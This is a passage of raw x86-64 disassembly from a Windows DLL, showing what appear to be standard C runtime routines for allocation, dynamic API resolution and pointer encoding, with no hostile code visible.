   180009ba0:	e8 97 fe ff ff       	call   0x180009a3c
   180009ba5:	85 c0                	test   %eax,%eax
   180009ba7:	74 08                	je     0x180009bb1
   180009ba9:	48 8b f7             	mov    %rdi,%rsi
   180009bac:	49 8b fe             	mov    %r14,%rdi
   180009baf:	eb 03                	jmp    0x180009bb4
   180009bb1:	49 8b f6             	mov    %r14,%rsi
   180009bb4:	48 8b cf             	mov    %rdi,%rcx
   180009bb7:	e8 d8 e6 ff ff       	call   0x180008294
   180009bbc:	eb 03                	jmp    0x180009bc1
   180009bbe:	49 8b f6             	mov    %r14,%rsi
   180009bc1:	48 85 db             	test   %rbx,%rbx
   180009bc4:	74 09                	je     0x180009bcf
   180009bc6:	48 8b cb             	mov    %rbx,%rcx
   180009bc9:	ff 15 e9 65 00 00    	call   *0x65e9(%rip)        # 0x1800101b8
   180009bcf:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180009bd4:	48 8b c6             	mov    %rsi,%rax
   180009bd7:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   180009bdc:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   180009be1:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   180009be6:	48 83 c4 40          	add    $0x40,%rsp
   180009bea:	41 5e                	pop    %r14
   180009bec:	c3                   	ret
   180009bed:	cc                   	int3
   180009bee:	cc                   	int3
   180009bef:	cc                   	int3
   180009bf0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180009bf5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180009bfa:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180009bff:	57                   	push   %rdi
   180009c00:	48 83 ec 20          	sub    $0x20,%rsp
   180009c04:	49 8b e8             	mov    %r8,%rbp
   180009c07:	48 8b da             	mov    %rdx,%rbx
   180009c0a:	48 8b f1             	mov    %rcx,%rsi
   180009c0d:	48 85 d2             	test   %rdx,%rdx
   180009c10:	74 1d                	je     0x180009c2f
   180009c12:	33 d2                	xor    %edx,%edx
   180009c14:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   180009c18:	48 f7 f3             	div    %rbx
   180009c1b:	49 3b c0             	cmp    %r8,%rax
   180009c1e:	73 0f                	jae    0x180009c2f
   180009c20:	e8 d7 e5 ff ff       	call   0x1800081fc
   180009c25:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   180009c2b:	33 c0                	xor    %eax,%eax
   180009c2d:	eb 41                	jmp    0x180009c70
   180009c2f:	48 85 f6             	test   %rsi,%rsi
   180009c32:	74 0a                	je     0x180009c3e
   180009c34:	e8 23 27 00 00       	call   0x18000c35c
   180009c39:	48 8b f8             	mov    %rax,%rdi
   180009c3c:	eb 02                	jmp    0x180009c40
   180009c3e:	33 ff                	xor    %edi,%edi
   180009c40:	48 0f af dd          	imul   %rbp,%rbx
   180009c44:	48 8b ce             	mov    %rsi,%rcx
   180009c47:	48 8b d3             	mov    %rbx,%rdx
   180009c4a:	e8 49 27 00 00       	call   0x18000c398
   180009c4f:	48 8b f0             	mov    %rax,%rsi
   180009c52:	48 85 c0             	test   %rax,%rax
   180009c55:	74 16                	je     0x180009c6d
   180009c57:	48 3b fb             	cmp    %rbx,%rdi
   180009c5a:	73 11                	jae    0x180009c6d
   180009c5c:	48 2b df             	sub    %rdi,%rbx
   180009c5f:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   180009c63:	4c 8b c3             	mov    %rbx,%r8
   180009c66:	33 d2                	xor    %edx,%edx
   180009c68:	e8 13 9a ff ff       	call   0x180003680
   180009c6d:	48 8b c6             	mov    %rsi,%rax
   180009c70:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180009c75:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180009c7a:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180009c7f:	48 83 c4 20          	add    $0x20,%rsp
   180009c83:	5f                   	pop    %rdi
   180009c84:	c3                   	ret
   180009c85:	cc                   	int3
   180009c86:	cc                   	int3
   180009c87:	cc                   	int3
   180009c88:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180009c8d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180009c92:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180009c97:	57                   	push   %rdi
   180009c98:	41 54                	push   %r12
   180009c9a:	41 55                	push   %r13
   180009c9c:	41 56                	push   %r14
   180009c9e:	41 57                	push   %r15
   180009ca0:	48 83 ec 20          	sub    $0x20,%rsp
   180009ca4:	44 8b f9             	mov    %ecx,%r15d
   180009ca7:	4c 8d 35 52 63 ff ff 	lea    -0x9cae(%rip),%r14        # 0x180000000
   180009cae:	4d 8b e1             	mov    %r9,%r12
   180009cb1:	49 8b e8             	mov    %r8,%rbp
   180009cb4:	4c 8b ea             	mov    %rdx,%r13
   180009cb7:	4b 8b 8c fe 10 b7 01 	mov    0x1b710(%r14,%r15,8),%rcx
   180009cbe:	00 
   180009cbf:	4c 8b 15 4a 03 01 00 	mov    0x1034a(%rip),%r10        # 0x18001a010
   180009cc6:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   180009cca:	41 8b c2             	mov    %r10d,%eax
   180009ccd:	49 8b d2             	mov    %r10,%rdx
   180009cd0:	48 33 d1             	xor    %rcx,%rdx
   180009cd3:	83 e0 3f             	and    $0x3f,%eax
   180009cd6:	8a c8                	mov    %al,%cl
   180009cd8:	48 d3 ca             	ror    %cl,%rdx
   180009cdb:	48 3b d7             	cmp    %rdi,%rdx
   180009cde:	0f 84 5b 01 00 00    	je     0x180009e3f
   180009ce4:	48 85 d2             	test   %rdx,%rdx
   180009ce7:	74 08                	je     0x180009cf1
   180009ce9:	48 8b c2             	mov    %rdx,%rax
   180009cec:	e9 50 01 00 00       	jmp    0x180009e41
   180009cf1:	4d 3b c4             	cmp    %r12,%r8
   180009cf4:	0f 84 d9 00 00 00    	je     0x180009dd3
   180009cfa:	8b 75 00             	mov    0x0(%rbp),%esi
   180009cfd:	49 8b 9c f6 70 b6 01 	mov    0x1b670(%r14,%rsi,8),%rbx
   180009d04:	00 
   180009d05:	48 85 db             	test   %rbx,%rbx
   180009d08:	74 0e                	je     0x180009d18
   180009d0a:	48 3b df             	cmp    %rdi,%rbx
   180009d0d:	0f 84 ac 00 00 00    	je     0x180009dbf
   180009d13:	e9 a2 00 00 00       	jmp    0x180009dba
   180009d18:	4d 8b b4 f6 80 17 01 	mov    0x11780(%r14,%rsi,8),%r14
   180009d1f:	00 
   180009d20:	33 d2                	xor    %edx,%edx
   180009d22:	49 8b ce             	mov    %r14,%rcx
   180009d25:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   180009d2b:	ff 15 f7 63 00 00    	call   *0x63f7(%rip)        # 0x180010128
   180009d31:	48 8b d8             	mov    %rax,%rbx
   180009d34:	48 85 c0             	test   %rax,%rax
   180009d37:	75 4f                	jne    0x180009d88
   180009d39:	ff 15 81 63 00 00    	call   *0x6381(%rip)        # 0x1800100c0
   180009d3f:	83 f8 57             	cmp    $0x57,%eax
   180009d42:	75 42                	jne    0x180009d86
   180009d44:	8d 58 b0             	lea    -0x50(%rax),%ebx
   180009d47:	49 8b ce             	mov    %r14,%rcx
   180009d4a:	44 8b c3             	mov    %ebx,%r8d
   180009d4d:	48 8d 15 c4 75 00 00 	lea    0x75c4(%rip),%rdx        # 0x180011318
   180009d54:	e8 67 dc ff ff       	call   0x1800079c0
   180009d59:	85 c0                	test   %eax,%eax
   180009d5b:	74 29                	je     0x180009d86
   180009d5d:	44 8b c3             	mov    %ebx,%r8d
   180009d60:	48 8d 15 11 7f 00 00 	lea    0x7f11(%rip),%rdx        # 0x180011c78
   180009d67:	49 8b ce             	mov    %r14,%rcx
   180009d6a:	e8 51 dc ff ff       	call   0x1800079c0
   180009d6f:	85 c0                	test   %eax,%eax
   180009d71:	74 13                	je     0x180009d86
   180009d73:	45 33 c0             	xor    %r8d,%r8d
   180009d76:	33 d2                	xor    %edx,%edx
   180009d78:	49 8b ce             	mov    %r14,%rcx
   180009d7b:	ff 15 a7 63 00 00    	call   *0x63a7(%rip)        # 0x180010128
   180009d81:	48 8b d8             	mov    %rax,%rbx
   180009d84:	eb 02                	jmp    0x180009d88
   180009d86:	33 db                	xor    %ebx,%ebx
   180009d88:	4c 8d 35 71 62 ff ff 	lea    -0x9d8f(%rip),%r14        # 0x180000000
   180009d8f:	48 85 db             	test   %rbx,%rbx
   180009d92:	75 0d                	jne    0x180009da1
   180009d94:	48 8b c7             	mov    %rdi,%rax
   180009d97:	49 87 84 f6 70 b6 01 	xchg   %rax,0x1b670(%r14,%rsi,8)
   180009d9e:	00 
   180009d9f:	eb 1e                	jmp    0x180009dbf
   180009da1:	48 8b c3             	mov    %rbx,%rax
   180009da4:	49 87 84 f6 70 b6 01 	xchg   %rax,0x1b670(%r14,%rsi,8)
   180009dab:	00 
   180009dac:	48 85 c0             	test   %rax,%rax
   180009daf:	74 09                	je     0x180009dba
   180009db1:	48 8b cb             	mov    %rbx,%rcx
   180009db4:	ff 15 5e 63 00 00    	call   *0x635e(%rip)        # 0x180010118
   180009dba:	48 85 db             	test   %rbx,%rbx
   180009dbd:	75 55                	jne    0x180009e14
   180009dbf:	48 83 c5 04          	add    $0x4,%rbp
   180009dc3:	49 3b ec             	cmp    %r12,%rbp
   180009dc6:	0f 85 2e ff ff ff    	jne    0x180009cfa
   180009dcc:	4c 8b 15 3d 02 01 00 	mov    0x1023d(%rip),%r10        # 0x18001a010
   180009dd3:	33 db                	xor    %ebx,%ebx
   180009dd5:	48 85 db             	test   %rbx,%rbx
   180009dd8:	74 4a                	je     0x180009e24
   180009dda:	49 8b d5             	mov    %r13,%rdx
   180009ddd:	48 8b cb             	mov    %rbx,%rcx
   180009de0:	ff 15 3a 63 00 00    	call   *0x633a(%rip)        # 0x180010120
   180009de6:	48 85 c0             	test   %rax,%rax
   180009de9:	74 32                	je     0x180009e1d
   180009deb:	4c 8b 05 1e 02 01 00 	mov    0x1021e(%rip),%r8        # 0x18001a010
   180009df2:	ba 40 00 00 00       	mov    $0x40,%edx
   180009df7:	41 8b c8             	mov    %r8d,%ecx
   180009dfa:	83 e1 3f             	and    $0x3f,%ecx
   180009dfd:	2b d1                	sub    %ecx,%edx
   180009dff:	8a ca                	mov    %dl,%cl
   180009e01:	48 8b d0             	mov    %rax,%rdx
   180009e04:	48 d3 ca             	ror    %cl,%rdx
   180009e07:	49 33 d0             	xor    %r8,%rdx
   180009e0a:	4b 87 94 fe 10 b7 01 	xchg   %rdx,0x1b710(%r14,%r15,8)
   180009e11:	00 
   180009e12:	eb 2d                	jmp    0x180009e41
   180009e14:	4c 8b 15 f5 01 01 00 	mov    0x101f5(%rip),%r10        # 0x18001a010
   180009e1b:	eb b8                	jmp    0x180009dd5
   180009e1d:	4c 8b 15 ec 01 01 00 	mov    0x101ec(%rip),%r10        # 0x18001a010
   180009e24:	41 8b c2             	mov    %r10d,%eax
   180009e27:	b9 40 00 00 00       	mov    $0x40,%ecx
   180009e2c:	83 e0 3f             	and    $0x3f,%eax
   180009e2f:	2b c8                	sub    %eax,%ecx
   180009e31:	48 d3 cf             	ror    %cl,%rdi
   180009e34:	49 33 fa             	xor    %r10,%rdi
   180009e37:	4b 87 bc fe 10 b7 01 	xchg   %rdi,0x1b710(%r14,%r15,8)
   180009e3e:	00 
   180009e3f:	33 c0                	xor    %eax,%eax
   180009e41:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180009e46:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   180009e4b:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   180009e50:	48 83 c4 20          	add    $0x20,%rsp
   180009e54:	41 5f                	pop    %r15
   180009e56:	41 5e                	pop    %r14
   180009e58:	41 5d                	pop    %r13
   180009e5a:	41 5c                	pop    %r12
   180009e5c:	5f                   	pop    %rdi
   180009e5d:	c3                   	ret
   180009e5e:	cc                   	int3
   180009e5f:	cc                   	int3
   180009e60:	40 53                	rex push %rbx
   180009e62:	48 83 ec 20          	sub    $0x20,%rsp
   180009e66:	48 8b d9             	mov    %rcx,%rbx
   180009e69:	4c 8d 0d 90 7e 00 00 	lea    0x7e90(%rip),%r9        # 0x180011d00
   180009e70:	b9 1c 00 00 00       	mov    $0x1c,%ecx
   180009e75:	4c 8d 05 80 7e 00 00 	lea    0x7e80(%rip),%r8        # 0x180011cfc
   180009e7c:	48 8d 15 7d 7e 00 00 	lea    0x7e7d(%rip),%rdx        # 0x180011d00
   180009e83:	e8 00 fe ff ff       	call   0x180009c88
   180009e88:	48 85 c0             	test   %rax,%rax
   180009e8b:	74 16                	je     0x180009ea3
   180009e8d:	48 8b d3             	mov    %rbx,%rdx
   180009e90:	48 c7 c1 fa ff ff ff 	mov    $0xfffffffffffffffa,%rcx
   180009e97:	48 83 c4 20          	add    $0x20,%rsp
   180009e9b:	5b                   	pop    %rbx
   180009e9c:	48 ff 25 c5 63 00 00 	rex.W jmp *0x63c5(%rip)        # 0x180010268
   180009ea3:	b8 25 02 00 c0       	mov    $0xc0000225,%eax
   180009ea8:	48 83 c4 20          	add    $0x20,%rsp
   180009eac:	5b                   	pop    %rbx
   180009ead:	c3                   	ret
   180009eae:	cc                   	int3
   180009eaf:	cc                   	int3
   180009eb0:	48 83 ec 28          	sub    $0x28,%rsp
   180009eb4:	4c 8d 0d d1 7d 00 00 	lea    0x7dd1(%rip),%r9        # 0x180011c8c
   180009ebb:	33 c9                	xor    %ecx,%ecx
   180009ebd:	4c 8d 05 c4 7d 00 00 	lea    0x7dc4(%rip),%r8        # 0x180011c88
   180009ec4:	48 8d 15 c5 7d 00 00 	lea    0x7dc5(%rip),%rdx        # 0x180011c90
   180009ecb:	e8 b8 fd ff ff       	call   0x180009c88
   180009ed0:	48 85 c0             	test   %rax,%rax
   180009ed3:	74 0b                	je     0x180009ee0
   180009ed5:	48 83 c4 28          	add    $0x28,%rsp
   180009ed9:	48 ff 25 88 63 00 00 	rex.W jmp *0x6388(%rip)        # 0x180010268
   180009ee0:	b8 01 00 00 00       	mov    $0x1,%eax
   180009ee5:	48 83 c4 28          	add    $0x28,%rsp
   180009ee9:	c3                   	ret
   180009eea:	cc                   	int3
   180009eeb:	cc                   	int3
   180009eec:	40 53                	rex push %rbx
   180009eee:	48 83 ec 20          	sub    $0x20,%rsp
   180009ef2:	48 8b d9             	mov    %rcx,%rbx
   180009ef5:	4c 8d 0d ac 7d 00 00 	lea    0x7dac(%rip),%r9        # 0x180011ca8
   180009efc:	b9 03 00 00 00       	mov    $0x3,%ecx
   180009f01:	4c 8d 05 98 7d 00 00 	lea    0x7d98(%rip),%r8        # 0x180011ca0
   180009f08:	48 8d 15 21 74 00 00 	lea    0x7421(%rip),%rdx        # 0x180011330
   180009f0f:	e8 74 fd ff ff       	call   0x180009c88
   180009f14:	48 85 c0             	test   %rax,%rax
   180009f17:	74 0f                	je     0x180009f28
   180009f19:	48 8b cb             	mov    %rbx,%rcx
   180009f1c:	48 83 c4 20          	add    $0x20,%rsp
   180009f20:	5b                   	pop    %rbx
   180009f21:	48 ff 25 40 63 00 00 	rex.W jmp *0x6340(%rip)        # 0x180010268
   180009f28:	48 83 c4 20          	add    $0x20,%rsp
   180009f2c:	5b                   	pop    %rbx
   180009f2d:	48 ff 25 c4 61 00 00 	rex.W jmp *0x61c4(%rip)        # 0x1800100f8
   180009f34:	40 53                	rex push %rbx
   180009f36:	48 83 ec 20          	sub    $0x20,%rsp
   180009f3a:	8b d9                	mov    %ecx,%ebx
   180009f3c:	4c 8d 0d 6d 7d 00 00 	lea    0x7d6d(%rip),%r9        # 0x180011cb0
   180009f43:	b9 04 00 00 00       	mov    $0x4,%ecx
   180009f48:	4c 8d 05 59 7d 00 00 	lea    0x7d59(%rip),%r8        # 0x180011ca8
   180009f4f:	48 8d 15 f2 73 00 00 	lea    0x73f2(%rip),%rdx        # 0x180011348
   180009f56:	e8 2d fd ff ff       	call   0x180009c88
   180009f5b:	8b cb                	mov    %ebx,%ecx
   180009f5d:	48 85 c0             	test   %rax,%rax
   180009f60:	74 0c                	je     0x180009f6e
   180009f62:	48 83 c4 20          	add    $0x20,%rsp
   180009f66:	5b                   	pop    %rbx
   180009f67:	48 ff 25 fa 62 00 00 	rex.W jmp *0x62fa(%rip)        # 0x180010268
   180009f6e:	48 83 c4 20          	add    $0x20,%rsp
   180009f72:	5b                   	pop    %rbx
   180009f73:	48 ff 25 96 61 00 00 	rex.W jmp *0x6196(%rip)        # 0x180010110
   180009f7a:	cc                   	int3
   180009f7b:	cc                   	int3
   180009f7c:	40 53                	rex push %rbx
   180009f7e:	48 83 ec 20          	sub    $0x20,%rsp
   180009f82:	8b d9                	mov    %ecx,%ebx
   180009f84:	4c 8d 0d 2d 7d 00 00 	lea    0x7d2d(%rip),%r9        # 0x180011cb8
   180009f8b:	b9 05 00 00 00       	mov    $0x5,%ecx
   180009f90:	4c 8d 05 19 7d 00 00 	lea    0x7d19(%rip),%r8        # 0x180011cb0
   180009f97:	48 8d 15 ba 73 00 00 	lea    0x73ba(%rip),%rdx        # 0x180011358
   180009f9e:	e8 e5 fc ff ff       	call   0x180009c88
   180009fa3:	8b cb                	mov    %ebx,%ecx
   180009fa5:	48 85 c0             	test   %rax,%rax
   180009fa8:	74 0c                	je     0x180009fb6
   180009faa:	48 83 c4 20          	add    $0x20,%rsp
   180009fae:	5b                   	pop    %rbx
   180009faf:	48 ff 25 b2 62 00 00 	rex.W jmp *0x62b2(%rip)        # 0x180010268
   180009fb6:	48 83 c4 20          	add    $0x20,%rsp
   180009fba:	5b                   	pop    %rbx
   180009fbb:	48 ff 25 3e 61 00 00 	rex.W jmp *0x613e(%rip)        # 0x180010100
   180009fc2:	cc                   	int3
   180009fc3:	cc                   	int3
   180009fc4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180009fc9:	57                   	push   %rdi
   180009fca:	48 83 ec 20          	sub    $0x20,%rsp
   180009fce:	48 8b da             	mov    %rdx,%rbx
   180009fd1:	4c 8d 0d e8 7c 00 00 	lea    0x7ce8(%rip),%r9        # 0x180011cc0
   180009fd8:	8b f9                	mov    %ecx,%edi
   180009fda:	48 8d 15 8f 73 00 00 	lea    0x738f(%rip),%rdx        # 0x180011370
   180009fe1:	b9 06 00 00 00       	mov    $0x6,%ecx
   180009fe6:	4c 8d 05 cb 7c 00 00 	lea    0x7ccb(%rip),%r8        # 0x180011cb8
   180009fed:	e8 96 fc ff ff       	call   0x180009c88
   180009ff2:	48 8b d3             	mov    %rbx,%rdx
   180009ff5:	8b cf                	mov    %edi,%ecx
   180009ff7:	48 85 c0             	test   %rax,%rax
   180009ffa:	74 08                	je     0x18000a004
   180009ffc:	ff 15 66 62 00 00    	call   *0x6266(%rip)        # 0x180010268
   18000a002:	eb 06                	jmp    0x18000a00a
   18000a004:	ff 15 fe 60 00 00    	call   *0x60fe(%rip)        # 0x180010108
   18000a00a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a00f:	48 83 c4 20          	add    $0x20,%rsp
   18000a013:	5f                   	pop    %rdi
   18000a014:	c3                   	ret
   18000a015:	cc                   	int3
   18000a016:	cc                   	int3
   18000a017:	cc                   	int3
   18000a018:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000a01d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000a022:	57                   	push   %rdi
   18000a023:	48 83 ec 20          	sub    $0x20,%rsp
   18000a027:	41 8b f0             	mov    %r8d,%esi
   18000a02a:	4c 8d 0d 97 7c 00 00 	lea    0x7c97(%rip),%r9        # 0x180011cc8
   18000a031:	8b da                	mov    %edx,%ebx
   18000a033:	4c 8d 05 86 7c 00 00 	lea    0x7c86(%rip),%r8        # 0x180011cc0
   18000a03a:	48 8b f9             	mov    %rcx,%rdi
   18000a03d:	48 8d 15 44 73 00 00 	lea    0x7344(%rip),%rdx        # 0x180011388
   18000a044:	b9 12 00 00 00       	mov    $0x12,%ecx
   18000a049:	e8 3a fc ff ff       	call   0x180009c88
   18000a04e:	8b d3                	mov    %ebx,%edx
   18000a050:	48 8b cf             	mov    %rdi,%rcx
   18000a053:	48 85 c0             	test   %rax,%rax
   18000a056:	74 0b                	je     0x18000a063
   18000a058:	44 8b c6             	mov    %esi,%r8d
   18000a05b:	ff 15 07 62 00 00    	call   *0x6207(%rip)        # 0x180010268
   18000a061:	eb 06                	jmp    0x18000a069
   18000a063:	ff 15 87 60 00 00    	call   *0x6087(%rip)        # 0x1800100f0
   18000a069:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a06e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000a073:	48 83 c4 20          	add    $0x20,%rsp
   18000a077:	5f                   	pop    %rdi
   18000a078:	c3                   	ret
   18000a079:	cc                   	int3
   18000a07a:	cc                   	int3
   18000a07b:	cc                   	int3
   18000a07c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000a081:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000a086:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000a08b:	57                   	push   %rdi
   18000a08c:	48 83 ec 50          	sub    $0x50,%rsp
   18000a090:	41 8b d9             	mov    %r9d,%ebx
   18000a093:	49 8b f8             	mov    %r8,%rdi
   18000a096:	8b f2                	mov    %edx,%esi
   18000a098:	4c 8d 0d 31 7c 00 00 	lea    0x7c31(%rip),%r9        # 0x180011cd0
   18000a09f:	48 8b e9             	mov    %rcx,%rbp
   18000a0a2:	4c 8d 05 1f 7c 00 00 	lea    0x7c1f(%rip),%r8        # 0x180011cc8
   18000a0a9:	48 8d 15 20 7c 00 00 	lea    0x7c20(%rip),%rdx        # 0x180011cd0
   18000a0b0:	b9 14 00 00 00       	mov    $0x14,%ecx
   18000a0b5:	e8 ce fb ff ff       	call   0x180009c88
   18000a0ba:	48 85 c0             	test   %rax,%rax
   18000a0bd:	74 52                	je     0x18000a111
   18000a0bf:	4c 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%r8
   18000a0c6:	00 
   18000a0c7:	44 8b cb             	mov    %ebx,%r9d
   18000a0ca:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   18000a0d1:	00 
   18000a0d2:	8b d6                	mov    %esi,%edx
   18000a0d4:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   18000a0d9:	4c 8b c7             	mov    %rdi,%r8
   18000a0dc:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   18000a0e1:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   18000a0e8:	00 
   18000a0e9:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   18000a0ee:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
   18000a0f5:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   18000a0f9:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   18000a100:	00 
   18000a101:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   18000a106:	48 8b cd             	mov    %rbp,%rcx
   18000a109:	ff 15 59 61 00 00    	call   *0x6159(%rip)        # 0x180010268
   18000a10f:	eb 32                	jmp    0x18000a143
   18000a111:	33 d2                	xor    %edx,%edx
   18000a113:	48 8b cd             	mov    %rbp,%rcx
   18000a116:	e8 3d 00 00 00       	call   0x18000a158
   18000a11b:	8b c8                	mov    %eax,%ecx
   18000a11d:	44 8b cb             	mov    %ebx,%r9d
   18000a120:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
   18000a127:	4c 8b c7             	mov    %rdi,%r8
   18000a12a:	89 44 24 28          	mov    %eax,0x28(%rsp)
   18000a12e:	8b d6                	mov    %esi,%edx
   18000a130:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   18000a137:	00 
   18000a138:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000a13d:	ff 15 7d 60 00 00    	call   *0x607d(%rip)        # 0x1800101c0
   18000a143:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   18000a148:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   18000a14d:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   18000a152:	48 83 c4 50          	add    $0x50,%rsp
   18000a156:	5f                   	pop    %rdi
   18000a157:	c3                   	ret
   18000a158:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000a15d:	57                   	push   %rdi
   18000a15e:	48 83 ec 20          	sub    $0x20,%rsp
   18000a162:	8b fa                	mov    %edx,%edi
   18000a164:	4c 8d 0d 7d 7b 00 00 	lea    0x7b7d(%rip),%r9        # 0x180011ce8
   18000a16b:	48 8b d9             	mov    %rcx,%rbx
   18000a16e:	48 8d 15 73 7b 00 00 	lea    0x7b73(%rip),%rdx        # 0x180011ce8
   18000a175:	b9 16 00 00 00       	mov    $0x16,%ecx
   18000a17a:	4c 8d 05 5f 7b 00 00 	lea    0x7b5f(%rip),%r8        # 0x180011ce0
   18000a181:	e8 02 fb ff ff       	call   0x180009c88
   18000a186:	48 8b cb             	mov    %rbx,%rcx
   18000a189:	48 85 c0             	test   %rax,%rax
   18000a18c:	74 0a                	je     0x18000a198
   18000a18e:	8b d7                	mov    %edi,%edx
   18000a190:	ff 15 d2 60 00 00    	call   *0x60d2(%rip)        # 0x180010268
   18000a196:	eb 05                	jmp    0x18000a19d
   18000a198:	e8 77 22 00 00       	call   0x18000c414
   18000a19d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a1a2:	48 83 c4 20          	add    $0x20,%rsp
   18000a1a6:	5f                   	pop    %rdi
   18000a1a7:	c3                   	ret
   18000a1a8:	48 89 7c 24 08       	mov    %rdi,0x8(%rsp)
   18000a1ad:	48 8d 3d 5c 15 01 00 	lea    0x1155c(%rip),%rdi        # 0x18001b710
   18000a1b4:	48 8d 05 65 16 01 00 	lea    0x11665(%rip),%rax        # 0x18001b820
   18000a1bb:	48 3b c7             	cmp    %rdi,%rax
   18000a1be:	48 8b 05 4b fe 00 00 	mov    0xfe4b(%rip),%rax        # 0x18001a010
   18000a1c5:	48 1b c9             	sbb    %rcx,%rcx
   18000a1c8:	48 f7 d1             	not    %rcx
   18000a1cb:	83 e1 22             	and    $0x22,%ecx
   18000a1ce:	f3 48 ab             	rep stos %rax,(%rdi)
   18000a1d1:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
   18000a1d6:	b0 01                	mov    $0x1,%al
   18000a1d8:	c3                   	ret
   18000a1d9:	cc                   	int3
   18000a1da:	cc                   	int3
   18000a1db:	cc                   	int3
   18000a1dc:	40 53                	rex push %rbx
   18000a1de:	48 83 ec 20          	sub    $0x20,%rsp
   18000a1e2:	84 c9                	test   %cl,%cl
   18000a1e4:	75 2f                	jne    0x18000a215
   18000a1e6:	48 8d 1d 83 14 01 00 	lea    0x11483(%rip),%rbx        # 0x18001b670
   18000a1ed:	48 8b 0b             	mov    (%rbx),%rcx
   18000a1f0:	48 85 c9             	test   %rcx,%rcx
   18000a1f3:	74 10                	je     0x18000a205
   18000a1f5:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   18000a1f9:	74 06                	je     0x18000a201
   18000a1fb:	ff 15 17 5f 00 00    	call   *0x5f17(%rip)        # 0x180010118
   18000a201:	48 83 23 00          	andq   $0x0,(%rbx)
   18000a205:	48 83 c3 08          	add    $0x8,%rbx
   18000a209:	48 8d 05 00 15 01 00 	lea    0x11500(%rip),%rax        # 0x18001b710
   18000a210:	48 3b d8             	cmp    %rax,%rbx
   18000a213:	75 d8                	jne    0x18000a1ed
   18000a215:	b0 01                	mov    $0x1,%al
   18000a217:	48 83 c4 20          	add    $0x20,%rsp
   18000a21b:	5b                   	pop    %rbx
   18000a21c:	c3                   	ret
   18000a21d:	cc                   	int3
   18000a21e:	cc                   	int3
   18000a21f:	cc                   	int3
   18000a220:	48 83 ec 28          	sub    $0x28,%rsp
   18000a224:	ff 15 9e 5f 00 00    	call   *0x5f9e(%rip)        # 0x1800101c8
   18000a22a:	48 85 c0             	test   %rax,%rax
   18000a22d:	48 89 05 ec 15 01 00 	mov    %rax,0x115ec(%rip)        # 0x18001b820
   18000a234:	0f 95 c0             	setne  %al
   18000a237:	48 83 c4 28          	add    $0x28,%rsp
   18000a23b:	c3                   	ret
   18000a23c:	48 83 25 dc 15 01 00 	andq   $0x0,0x115dc(%rip)        # 0x18001b820
   18000a243:	00 
   18000a244:	b0 01                	mov    $0x1,%al
   18000a246:	c3                   	ret
   18000a247:	cc                   	int3
   18000a248:	48 8b c4             	mov    %rsp,%rax
   18000a24b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   18000a24f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   18000a253:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000a257:	48 89 78 20          	mov    %rdi,0x20(%rax)
   18000a25b:	41 56                	push   %r14
   18000a25d:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   18000a264:	48 8d 48 88          	lea    -0x78(%rax),%rcx
   18000a268:	ff 15 fa 5d 00 00    	call   *0x5dfa(%rip)        # 0x180010068
   18000a26e:	45 33 f6             	xor    %r14d,%r14d
   18000a271:	66 44 39 74 24 62    	cmp    %r14w,0x62(%rsp)
   18000a277:	0f 84 9a 00 00 00    	je     0x18000a317
   18000a27d:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   18000a282:	48 85 c0             	test   %rax,%rax
   18000a285:	0f 84 8c 00 00 00    	je     0x18000a317
   18000a28b:	48 63 18             	movslq (%rax),%rbx
   18000a28e:	48 8d 70 04          	lea    0x4(%rax),%rsi
